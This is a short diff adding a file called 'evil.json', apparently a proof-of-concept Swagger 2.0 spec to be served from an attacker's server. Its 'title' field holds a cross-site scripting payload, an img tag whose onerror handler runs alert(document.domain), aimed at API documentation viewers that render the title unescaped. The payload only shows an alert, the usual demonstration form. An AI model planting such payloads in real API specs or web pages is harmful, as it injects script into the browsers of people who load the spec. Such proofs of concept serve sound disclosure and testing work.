@@ -1,0 +1,10 @@
+// evil.json — serve on your server
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "<img src=x onerror=alert(document.domain)>",
+    "version": "1.0"
+  },
+  "paths": {},
+  "host": "x"
+}
